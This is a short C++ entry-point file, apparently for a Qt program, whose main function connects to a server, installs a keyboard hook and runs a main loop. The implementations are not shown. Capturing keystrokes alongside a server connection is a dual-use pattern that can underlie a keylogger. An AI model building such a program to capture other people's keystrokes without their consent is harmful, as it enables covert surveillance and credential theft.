#include <QDebug>

#include "hook_client.h"

int main(int, char **)
{
    if (!ConnectToServer())
        return 1;
    if (!HookKeyboard())
        return 2;
    return MainLoop();
}
